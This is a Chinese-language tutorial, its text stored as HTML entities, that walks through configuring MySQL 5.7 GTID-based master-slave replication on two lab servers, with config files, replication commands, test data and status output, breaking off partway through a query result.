&#x5982;&#x679C;&#x6765;&#x81EA;&#x540C;&#x4E00;MySQL&#x5B9E;&#x4F8B;&#x7684;&#x4E8B;&#x52A1;&#x5E8F;&#x53F7;&#x6709;&#x591A;&#x4E2A;&#x8303;&#x56F4;&#x533A;&#x95F4;&#xFF0C;&#x5404;&#x7EC4;&#x8303;&#x56F4;&#x4E4B;&#x95F4;&#x7528;&#x5192;&#x53F7;&#x5206;&#x9694;&#x3002;&#x4F8B;&#x5982;&#xFF1A; 03a1eb63-c21a-11ec-b07f-000c2987bea6:1-6,03a1eb63-c21a-11ec-b07f-000c2987bea6:1-25 &#x53EF;&#x4EE5;&#x4F7F;&#x7528;show master status&#x5B9E;&#x65F6;&#x67E5;&#x770B;&#x5F53;&#x524D;&#x4E8B;&#x52A1;&#x6267;&#x884C;&#x6570;&#x3002; GTID&#x7684;&#x4F5C;&#x7528;GTID&#x91C7;&#x7528;&#x4E86;&#x65B0;&#x7684;&#x590D;&#x5236;&#x534F;&#x8BAE;&#xFF0C;&#x65E7;&#x534F;&#x8BAE;&#x662F;&#xFF0C;&#x9996;&#x5148;&#x4ECE;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x5728;&#x4E00;&#x4E2A;&#x7279;&#x5B9A;&#x7684;&#x504F;&#x79FB;&#x91CF;&#x4F4D;&#x7F6E;&#x8FDE;&#x63A5;&#x5230;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x4E00;&#x4E2A;&#x7ED9;&#x5B9A;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x518D;&#x4ECE;&#x7ED9;&#x5B9A;&#x7684;&#x8FDE;&#x63A5;&#x70B9;&#x5F00;&#x59CB;&#x53D1;&#x9001;&#x6240;&#x6709;&#x7684;&#x4E8B;&#x4EF6;&#x3002;&#x65B0;&#x534F;&#x8BAE;&#x6709;&#x6240;&#x4E0D;&#x540C;&#xFF0C;&#x652F;&#x6301;&#x4EE5;&#x5168;&#x5C40;&#x7EDF;&#x4E00;&#x4E8B;&#x52A1;ID (GTID)&#x4E3A;&#x57FA;&#x7840;&#x7684;&#x590D;&#x5236;&#x3002;&#x5F53;&#x5728;&#x4E3B;&#x5E93;&#x4E0A;&#x63D0;&#x4EA4;&#x4E8B;&#x52A1;&#x6216;&#x8005;&#x88AB;&#x4ECE;&#x5E93;&#x5E94;&#x7528;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x5B9A;&#x4F4D;&#x548C;&#x8FFD;&#x8E2A;&#x6BCF;&#x4E00;&#x4E2A;&#x4E8B;&#x52A1;&#x3002;GTID&#x590D;&#x5236;&#x662F;&#x5168;&#x90E8;&#x4EE5;&#x4E8B;&#x52A1;&#x4E3A;&#x57FA;&#x7840;&#xFF0C;&#x4F7F;&#x5F97;&#x68C0;&#x67E5;&#x4E3B;&#x4ECE;&#x4E00;&#x81F4;&#x6027;&#x53D8;&#x5F97;&#x975E;&#x5E38;&#x7B80;&#x5355;&#x3002;&#x5982;&#x679C;&#x6240;&#x6709;&#x4E3B;&#x5E93;&#x4E0A;&#x63D0;&#x4EA4;&#x7684;&#x4E8B;&#x52A1;&#x4E5F;&#x540C;&#x6837;&#x63D0;&#x4EA4;&#x5230;&#x4ECE;&#x5E93;&#x4E0A;&#xFF0C;&#x4E00;&#x81F4;&#x6027;&#x5C31;&#x5F97;&#x5230;&#x4E86;&#x4FDD;&#x8BC1;&#x3002; GTID&#x7684;&#x5DE5;&#x4F5C;&#x539F;&#x7406;&#x2460; &#x5F53;&#x4E00;&#x4E2A;&#x4E8B;&#x52A1;&#x5728;&#x4E3B;&#x5E93;&#x7AEF;&#x6267;&#x884C;&#x5E76;&#x63D0;&#x4EA4;&#x65F6;&#xFF0C;&#x4EA7;&#x751F;GTID&#xFF0C;&#x4E00;&#x540C;&#x8BB0;&#x5F55;&#x5230;binlog&#x65E5;&#x5FD7;&#x4E2D;&#x3002;&#x2461; binlog&#x4F20;&#x8F93;&#x5230;slave,&#x5E76;&#x5B58;&#x50A8;&#x5230;slave&#x7684;relaylog&#x540E;&#xFF0C;&#x8BFB;&#x53D6;&#x8FD9;&#x4E2A;GTID&#x7684;&#x8FD9;&#x4E2A;&#x503C;&#x8BBE;&#x7F6E;GTID_next&#x53D8;&#x91CF;&#xFF0C;&#x5373;&#x544A;&#x8BC9;Slave&#xFF0C;&#x4E0B;&#x4E00;&#x4E2A;&#x8981;&#x6267;&#x884C;&#x7684;GTID&#x503C;&#x3002;&#x2462; sql&#x7EBF;&#x7A0B;&#x4ECE;relay log&#x4E2D;&#x83B7;&#x53D6;GTID&#xFF0C;&#x7136;&#x540E;&#x5BF9;&#x6BD4;slave&#x7AEF;&#x7684;binlog&#x662F;&#x5426;&#x6709;&#x8BE5;GTID&#x3002;&#x2463; &#x5982;&#x679C;&#x6709;&#x8BB0;&#x5F55;&#xFF0C;&#x8BF4;&#x660E;&#x8BE5;GTID&#x7684;&#x4E8B;&#x52A1;&#x5DF2;&#x7ECF;&#x6267;&#x884C;&#xFF0C;slave&#x4F1A;&#x5FFD;&#x7565;&#x3002;&#x2464; &#x5982;&#x679C;&#x6CA1;&#x6709;&#x8BB0;&#x5F55;&#xFF0C;slave&#x5C31;&#x4F1A;&#x6267;&#x884C;&#x8BE5;GTID&#x4E8B;&#x52A1;&#xFF0C;&#x5E76;&#x8BB0;&#x5F55;&#x8BE5;GTID&#x5230;&#x81EA;&#x8EAB;&#x7684;binlog&#xFF0C;&#x5728;&#x8BFB;&#x53D6;&#x6267;&#x884C;&#x4E8B;&#x52A1;&#x524D;&#x4F1A;&#x5148;&#x68C0;&#x67E5;&#x5176;&#x4ED6;session&#x6301;&#x6709;&#x8BE5;GTID&#xFF0C;&#x786E;&#x4FDD;&#x4E0D;&#x88AB;&#x91CD;&#x590D;&#x6267;&#x884C;&#x3002;&#x2465; &#x5728;&#x89E3;&#x6790;&#x8FC7;&#x7A0B;&#x4E2D;&#x4F1A;&#x5224;&#x65AD;&#x662F;&#x5426;&#x6709;&#x4E3B;&#x952E;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x5C31;&#x7528;&#x4E8C;&#x7EA7;&#x7D22;&#x5F15;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x5C31;&#x7528;&#x5168;&#x90E8;&#x626B;&#x63CF;&#x3002; GTID&#x6BD4;&#x4F20;&#x7EDF;&#x590D;&#x5236;&#x7684;&#x4F18;&#x52BF; &#x66F4;&#x7B80;&#x5355;&#x7684;&#x5B9E;&#x73B0;failover&#xFF0C;&#x4E0D;&#x9700;&#x8981;&#x627E;log_file&#x548C;log_Pos &#x66F4;&#x7B80;&#x5355;&#x7684;&#x642D;&#x5EFA;&#x4E3B;&#x4ECE;&#x590D;&#x5236; &#x6BD4;&#x4F20;&#x7EDF;&#x590D;&#x5236;&#x66F4;&#x52A0;&#x5B89;&#x5168; GTID&#x662F;&#x8FDE;&#x7EED;&#x6CA1;&#x6709;&#x7A7A;&#x6D1E;&#x7684;&#xFF0C;&#x56E0;&#x6B64;&#x4E3B;&#x4ECE;&#x5E93;&#x51FA;&#x73B0;&#x6570;&#x636E;&#x51B2;&#x7A81;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;&#x6DFB;&#x52A0;&#x7A7A;&#x4E8B;&#x7269;&#x7684;&#x65B9;&#x5F0F;&#x8FDB;&#x884C;&#x8DF3;&#x8FC7; &#x914D;&#x7F6E;&#x4E00;&#x4E3B;&#x4E00;&#x4ECE;GTID123&#x6570;&#x636E;&#x5E93;&#x89D2;&#x8272; IP &#x7CFB;&#x7EDF;&#x4E0E;MySQL&#x7248;&#x672C; &#x6709;&#x65E0;&#x6570;&#x636E;&#x4E3B;&#x6570;&#x636E;&#x5E93; 192.168.10.11 RHEL7 MySQL5.7 &#x65E0;&#x6570;&#x636E;&#x4ECE;&#x6570;&#x636E;&#x5E93; 192.168.10.12 RHEL7 MySQL5.7 &#x65E0;&#x6570;&#x636E; &#x5728;&#x4E3B;&#x6570;&#x636E;&#x5E93;&#x91CC;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x540C;&#x6B65;&#x8D26;&#x6237;&#x6388;&#x6743;&#x7ED9;&#x4ECE;&#x6570;&#x636E;&#x5E93;&#x4F7F;&#x7528; 12345678910111213141516171819202122[root@server11 ~]# mysql -uroot -pJaking@vip.163.commysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 5Server version: 5.7.24 MySQL Community Server (GPL)Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.mysql&gt; grant replication slave on *.* to &apos;Jaking&apos;@&apos;192.168.10.%&apos; identified by &apos;Jaking@vip.163.com&apos;;Query OK, 0 rows affected, 1 warning (0.00 sec)mysql&gt; flush privileges;Query OK, 0 rows affected (0.00 sec)mysql&gt; exitBye &#x914D;&#x7F6E;&#x4E3B;&#x5E93;&#x6587;&#x4EF6; 12345678910111213141516171819[root@server11 ~]# vim /etc/my.cnf[mysqld]port=3306datadir=/var/lib/mysqlsocket=/var/lib/mysql/mysql.sockskip-name-resolvesymbolic-links=0log-error=/var/log/mysqld.logpid-file=/var/run/mysqld/mysqld.pidskip-name-resolvelog-bin=mysql-bin // &#x5F00;&#x542F;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;server-id=11 // &#x670D;&#x52A1;&#x5668;ID&#xFF0C;&#x5FC5;&#x987B;&#x552F;&#x4E00;gtid-mode=on #&#x5F00;&#x542F;gtid&#x6A21;&#x5F0F;enforce-gtid-consistency=on //&#x5F3A;&#x5236;gtid&#x4E00;&#x81F4;&#x6027;&#xFF0C;&#x5F00;&#x542F;&#x540E;&#x5BF9;&#x7279;&#x5B9A;&#x7684;create table&#x4E0D;&#x652F;&#x6301;binlog-format=row //&#x9ED8;&#x8BA4;&#x4E3A;mixed&#x6DF7;&#x5408;&#x6A21;&#x5F0F;&#xFF0C;&#x66F4;&#x6539;&#x6210;row&#x590D;&#x5236;&#xFF0C;&#x4E3A;&#x4E86;&#x6570;&#x636E;&#x4E00;&#x81F4;&#x6027;log-slave-updates=1 //&#x4ECE;&#x5E93;binlog&#x8BB0;&#x5F55;&#x4E3B;&#x5E93;&#x540C;&#x6B65;&#x7684;&#x64CD;&#x4F5C;&#x65E5;&#x5FD7;skip-slave-start=1 //&#x8DF3;&#x8FC7;slave&#x590D;&#x5236;&#x7EBF;&#x7A0B; 1234567891011121314151617[root@server11 ~]# systemctl restart mysqld[root@server11 ~]# systemctl status mysqld &#x25CF; mysqld.service - MySQL Server Loaded: loaded (/usr/lib/systemd/system/mysqld.service; enabled; vendor preset: disabled) Active: active (running) since Fri 2022-04-22 05:28:12 EDT; 6s ago Docs: man:mysqld(8) http://dev.mysql.com/doc/refman/en/using-systemd.html Process: 11752 ExecStart=/usr/sbin/mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid $MYSQLD_OPTS (code=exited, status=0/SUCCESS) Process: 11730 ExecStartPre=/usr/bin/mysqld_pre_systemd (code=exited, status=0/SUCCESS) Main PID: 11755 (mysqld) Tasks: 27 CGroup: /system.slice/mysqld.service &#x2514;&#x2500;11755 /usr/sbin/mysqld --daemonize --pid-file=/var/run/mysqld...Apr 22 05:28:11 server11 systemd[1]: Stopped MySQL Server.Apr 22 05:28:11 server11 systemd[1]: Starting MySQL Server...Apr 22 05:28:12 server11 systemd[1]: Started MySQL Server. &#x67E5;&#x770B;GTID&#x6A21;&#x5F0F;&#x72B6;&#x6001; 1234567891011121314[root@server11 ~]# mysql -uroot -pJaking@vip.163.com -e &apos;show variables like &quot;%GTID%&quot;;&apos;mysql: [Warning] Using a password on the command line interface can be insecure.+----------------------------------+-----------+| Variable_name | Value |+----------------------------------+-----------+| binlog_gtid_simple_recovery | ON || enforce_gtid_consistency | ON || gtid_executed_compression_period | 1000 || gtid_mode | ON || gtid_next | AUTOMATIC || gtid_owned | || gtid_purged | || session_track_gtids | OFF |+----------------------------------+-----------+ &#x914D;&#x7F6E;&#x4ECE;&#x5E93;&#x6587;&#x4EF6; 123456789101112131415161718192021222324252627282930313233[root@server12 ~]# vim /etc/my.cnf[mysqld]port=3306datadir=/var/lib/mysqlsocket=/var/lib/mysql/mysql.socksymbolic-links=0log-error=/var/log/mysqld.logpid-file=/var/run/mysqld/mysqld.pidskip-name-resolvelog-bin=mysql-binserver-id=12gtid-mode=on enforce-gtid-consistency=on binlog-format=rowlog-slave-updates=1skip-slave-start=1[root@server12 ~]# systemctl restart mysqld[root@server12 ~]# systemctl status mysqld &#x25CF; mysqld.service - MySQL Server Loaded: loaded (/usr/lib/systemd/system/mysqld.service; enabled; vendor preset: disabled) Active: active (running) since Fri 2022-04-22 18:08:39 CST; 8s ago Docs: man:mysqld(8) http://dev.mysql.com/doc/refman/en/using-systemd.html Process: 2749 ExecStart=/usr/sbin/mysqld --daemonize --pid-file=/var/run/mysqld/mysqld.pid $MYSQLD_OPTS (code=exited, status=0/SUCCESS) Process: 2731 ExecStartPre=/usr/bin/mysqld_pre_systemd (code=exited, status=0/SUCCESS) Main PID: 2753 (mysqld) CGroup: /system.slice/mysqld.service &#x2514;&#x2500;2753 /usr/sbin/mysqld --daemonize --pid-file=/var/run/mysqld/...Apr 22 18:08:38 server12 systemd[1]: Starting MySQL Server...Apr 22 18:08:39 server12 systemd[1]: Started MySQL Server. &#x67E5;&#x770B;GTID&#x6A21;&#x5F0F;&#x72B6;&#x6001; 1234567891011121314[root@server12 ~]# mysql -uroot -pJaking@vip.163.com -e &apos;show variables like &quot;%GTID%&quot;;&apos;mysql: [Warning] Using a password on the command line interface can be insecure.+----------------------------------+-----------+| Variable_name | Value |+----------------------------------+-----------+| binlog_gtid_simple_recovery | ON || enforce_gtid_consistency | ON || gtid_executed_compression_period | 1000 || gtid_mode | ON || gtid_next | AUTOMATIC || gtid_owned | || gtid_purged | || session_track_gtids | OFF |+----------------------------------+-----------+ &#x5F00;&#x542F;&#x4E3B;&#x4ECE;&#x540C;&#x6B65; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485[root@server12 ~]# mysql -uroot -pJaking@vip.163.commysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 3Server version: 5.7.24-log MySQL Community Server (GPL)Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.mysql&gt; change master to master_host=&apos;192.168.10.11&apos;, master_user=&apos;Jaking&apos;, master_password=&apos;Jaking@vip.163.com&apos;, master_auto_position=1;Query OK, 0 rows affected, 2 warnings (0.01 sec)mysql&gt; start slave;Query OK, 0 rows affected (0.00 sec)mysql&gt; show slave status\\G*************************** 1. row *************************** Slave_IO_State: Waiting for master to send event Master_Host: 192.168.10.11 Master_User: Jaking Master_Port: 3306 Connect_Retry: 60 Master_Log_File: mysql-bin.000002 Read_Master_Log_Pos: 154 Relay_Log_File: server12-relay-bin.000002 Relay_Log_Pos: 367 Relay_Master_Log_File: mysql-bin.000002 Slave_IO_Running: Yes Slave_SQL_Running: Yes Replicate_Do_DB: Replicate_Ignore_DB: Replicate_Do_Table: Replicate_Ignore_Table: Replicate_Wild_Do_Table: Replicate_Wild_Ignore_Table: Last_Errno: 0 Last_Error: Skip_Counter: 0 Exec_Master_Log_Pos: 154 Relay_Log_Space: 577 Until_Condition: None Until_Log_File: Until_Log_Pos: 0 Master_SSL_Allowed: No Master_SSL_CA_File: Master_SSL_CA_Path: Master_SSL_Cert: Master_SSL_Cipher: Master_SSL_Key: Seconds_Behind_Master: 0Master_SSL_Verify_Server_Cert: No Last_IO_Errno: 0 Last_IO_Error: Last_SQL_Errno: 0 Last_SQL_Error: Replicate_Ignore_Server_Ids: Master_Server_Id: 11 Master_UUID: 03a1eb63-c21a-11ec-b07f-000c2987bea6 Master_Info_File: /var/lib/mysql/master.info SQL_Delay: 0 SQL_Remaining_Delay: NULL Slave_SQL_Running_State: Slave has read all relay log; waiting for more updates Master_Retry_Count: 86400 Master_Bind: Last_IO_Error_Timestamp: Last_SQL_Error_Timestamp: Master_SSL_Crl: Master_SSL_Crlpath: Retrieved_Gtid_Set: Executed_Gtid_Set: Auto_Position: 1 Replicate_Rewrite_DB: Channel_Name: Master_TLS_Version: 1 row in set (0.00 sec) &#x67E5;&#x770B;&#x4E3B;&#x4ECE;&#x5E93;&#x7684;&#x4FE1;&#x606F;&#x662F;&#x5426;&#x540C;&#x6B65; &#x67E5;&#x770B;&#x4E3B;&#x5E93; 1234567891011121314151617181920212223[root@server11 ~]# mysql -uroot -pJaking@vip.163.commysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 5Server version: 5.7.24-log MySQL Community Server (GPL)Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || mysql || performance_schema || sys |+--------------------+4 rows in set (0.00 sec) &#x67E5;&#x770B;&#x4ECE;&#x5E93; 123456789101112131415161718192021222324[root@server12 ~]# mysql -uroot -pJaking@vip.163.commysql: [Warning] Using a password on the command line interface can be insecure.Welcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 6Server version: 5.7.24-log MySQL Community Server (GPL)Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\\h&apos; for help. Type &apos;\\c&apos; to clear the current input statement.mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || mysql || performance_schema || sys |+--------------------+4 rows in set (0.00 sec) &#x6D4B;&#x8BD5;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;&#x5728;&#x4E3B;&#x5E93;&#x6267;&#x884C;&#x4EE5;&#x4E0B;SQL&#x8BED;&#x53E5; 12345678910111213141516171819202122232425262728293031CREATE DATABASE BOOK;USE BOOK;CREATE TABLE book (name char(66),price int,pages int);INSERT INTO book(name,price,pages) VALUES(&apos;Linux&apos;,&apos;30&apos;,&apos;666&apos;);INSERT INTO book(name,price,pages) VALUES(&apos;Cloud Computing&apos;,&apos;60&apos;,&apos;666&apos;);INSERT INTO book(name,price,pages) VALUES(&apos;Operation System&apos;,&apos;80&apos;,&apos;666&apos;);INSERT INTO book(name,price,pages) VALUES(&apos;Artificial Intelligence&apos;,&apos;166&apos;,&apos;666&apos;);select * from book;------------------------------------------------------------------------------------mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || BOOK || mysql || performance_schema || sys |+--------------------+5 rows in set (0.00 sec)mysql&gt; select * from BOOK.book;+-------------------------+-------+-------+| name | price | pages |+-------------------------+-------+-------+| Linux | 30 | 666 || Cloud Computing | 60 | 666 || Operation System | 80 | 666 || Artificial Intelligence | 166 | 666 |+-------------------------+-------+-------+4 rows in set (0.00 sec) &#x5728;&#x4ECE;&#x5E93;&#x67E5;&#x770B;&#x6570;&#x636E;&#x662F;&#x5426;&#x540C;&#x6B65;&#x8FC7;&#x6765; 12345678910111213141516171819202122mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || BOOK || mysql || performance_schema || sys |+--------------------+5 rows in set (0.00 sec)mysql&gt; select * from BOOK.book;+-------------------------+-------+-------+| name | price | pages |+-------------------------+-------+-------+| Linux | 30 | 666 || Cloud Computing | 60 | 666 || Operation System | 80 | 666 || Artificial Intelligence | 166 | 666 |+-------------------------+-------+-------+4 rows in set (0.00 sec) &#x67E5;&#x770B;&#x4E3B;&#x5E93;&#x72B6;&#x6001; 1234567mysql&gt; show master status;+------------------+----------+--------------+------------------+------------------------------------------+| File | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |+------------------+----------+--------------+------------------+------------------------------------------+| mysql-bin.000002 | 1620 | | | 03a1eb63-c21a-11ec-b07f-000c2987bea6:1-6 |+------------------+----------+--------------+------------------+------------------------------------------+1 row in set (0.00 sec) &#x67E5;&#x770B;&#x4ECE;&#x5E93;&#x72B6;&#x6001; 1234567mysql&gt; show master status;+------------------+----------+--------------+------------------+------------------------------------------+| File | Position | Binlog_Do_DB | Binlog_Ignore_DB | Executed_Gtid_Set |+------------------+----------+--------------+------------------+------------------------------------------+| mysql-bin.000002 | 1584 | | | 03a1eb63-c21a-11ec-b07f-000c2987bea6:1-6 |+------------------+----------+--------------+------------------+------------------------------------------+1 row in set (0.00 sec) &#x4ECE;&#x5E93;&#x505C;&#x6389;&#x4E3B;&#x4ECE;&#x540C;&#x6B65; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263mysql&gt; stop slave;Query OK, 0 rows affected (0.00 sec)mysql&gt; show slave status\\G*************************** 1. row *************************** Slave_IO_State: Master_Host: 192.168.10.11 Master_User: Jaking Master_Port: 3306 Connect_Retry: 60 Master_Log_File: mysql-bin.000002 Read_Master_Log_Pos: 1620 Relay_Log_File: server12-relay-bin.000002 Relay_Log_Pos: 1833 Relay_Master_Log_File: mysql-bin.000002 Slave_IO_Running: No Slave_SQL_Running: No Replicate_Do_DB: Replicate_Ignore_DB: Replicate_Do_Table: Replicate_Ignore_Table: Replicate_Wild_Do_Table: Replicate_Wild_Ignore_Table: Last_Errno: 0 Last_Error: Skip_Counter: 0 Exec_Master_Log_Pos: 1620 Relay_Log_Space: 2043 Until_Condition: None Until_Log_File: Until_Log_Pos: 0 Master_SSL_Allowed: No Master_SSL_CA_File: Master_SSL_CA_Path: Master_SSL_Cert: Master_SSL_Cipher: Master_SSL_Key: Seconds_Behind_Master: NULLMaster_SSL_Verify_Server_Cert: No Last_IO_Errno: 0 Last_IO_Error: Last_SQL_Errno: 0 Last_SQL_Error: Replicate_Ignore_Server_Ids: Master_Server_Id: 11 Master_UUID: 03a1eb63-c21a-11ec-b07f-000c2987bea6 Master_Info_File: /var/lib/mysql/master.info SQL_Delay: 0 SQL_Remaining_Delay: NULL Slave_SQL_Running_State: Master_Retry_Count: 86400 Master_Bind: Last_IO_Error_Timestamp: Last_SQL_Error_Timestamp: Master_SSL_Crl: Master_SSL_Crlpath: Retrieved_Gtid_Set: 03a1eb63-c21a-11ec-b07f-000c2987bea6:1-6 Executed_Gtid_Set: 03a1eb63-c21a-11ec-b07f-000c2987bea6:1-6 Auto_Position: 1 Replicate_Rewrite_DB: Channel_Name: Master_TLS_Version: 1 row in set (0.00 sec) &#x5728;&#x4E3B;&#x5E93;&#x521B;&#x5EFA;&#x6570;&#x636E;&#x540E;&#x4ECE;&#x5E93;&#x5F00;&#x542F;&#x4E3B;&#x4ECE;&#x540C;&#x6B65;&#x67E5;&#x770B;&#x662F;&#x5426;&#x540C;&#x6B65; 1234567891011121314151617181920212223242526CREATE DATABASE `testbookdb` DEFAULT CHARACTER SET utf8 COLLATE utf8_general_ci;show databases;use testbookdb;CREATE TABLE book1 (bTypeId int,bName char(16),price int,publishing char(16));INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;1&apos;,&apos;&#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B;&apos;,&apos;66&apos;,&apos;&#x7535;&#x5B50;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;2&apos;,&apos;&#x300A;&#x4E91;&#x8BA1;&#x7B97;&#x8D8B;&#x52BF;&#x300B;&apos;,&apos;68&apos;,&apos;&#x4EBA;&#x6C11;&#x90AE;&#x7535;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;3&apos;,&apos;&#x300A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;&#x300B;&apos;,&apos;90&apos;,&apos;&#x673A;&#x68B0;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;4&apos;,&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL&#x300B;&apos;,&apos;71&apos;,&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;5&apos;,&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL2&#x300B;&apos;,&apos;72&apos;,&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;6&apos;,&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL3&#x300B;&apos;,&apos;73&apos;,&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;7&apos;,&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL4&#x300B;&apos;,&apos;74&apos;,&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;8&apos;,&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL5&#x300B;&apos;,&apos;75&apos;,&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;9&apos;,&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL6&#x300B;&apos;,&apos;76&apos;,&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;10&apos;,&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL7&#x300B;&apos;,&apos;77&apos;,&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;11&apos;,&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL8&#x300B;&apos;,&apos;78&apos;,&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;);INSERT INTO book1(bTypeId,bName,price,publishing) VALUES(&apos;12&apos;,&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL9&#x300B;&apos;,&apos;79&apos;,&apos;&#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E;&apos;);CREATE TABLE book2 (name char(16),price int,pages int);INSERT INTO book2(name,price,pages) VALUES(&apos;&#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B;&apos;,&apos;30&apos;,&apos;666&apos;);INSERT INTO book2(name,price,pages) VALUES(&apos;&#x300A;&#x4E91;&#x8BA1;&#x7B97;&#x8D8B;&#x52BF;&#x300B;&apos;,&apos;60&apos;,&apos;666&apos;);INSERT INTO book2(name,price,pages) VALUES(&apos;&#x300A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;&#x300B;&apos;,&apos;80&apos;,&apos;666&apos;);INSERT INTO book2(name,price,pages) VALUES(&apos;&#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL&#x300B;&apos;,&apos;166&apos;,&apos;666&apos;);show tables;select * from book1;select * from book2; 1234567891011121314151617181920212223242526272829mysql&gt; select * from book1;+---------+-----------------------------------+-------+-----------------------+| bTypeId | bName | price | publishing |+---------+-----------------------------------+-------+-----------------------+| 1 | &#x300A;Linux&#x4ECE;&#x5165;&#x95E8;&#x5230;&#x7CBE;&#x901A;&#x300B; | 66 | &#x7535;&#x5B50;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E; || 2 | &#x300A;&#x4E91;&#x8BA1;&#x7B97;&#x8D8B;&#x52BF;&#x300B; | 68 | &#x4EBA;&#x6C11;&#x90AE;&#x7535;&#x51FA;&#x7248;&#x793E; || 3 | &#x300A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x8BBE;&#x8BA1;&#x4E0E;&#x5B9E;&#x73B0;&#x300B; | 90 | &#x673A;&#x68B0;&#x5DE5;&#x4E1A;&#x51FA;&#x7248;&#x793E; || 4 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL&#x300B; | 71 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E; || 5 | &#x300A;&#x9AD8;&#x6027;&#x80FD;MySQL2&#x300B; | 72 | &#x6E05;&#x534E;&#x5927;&#x5B66;&#x51FA;&#x7248;&#x793E; || 6 | 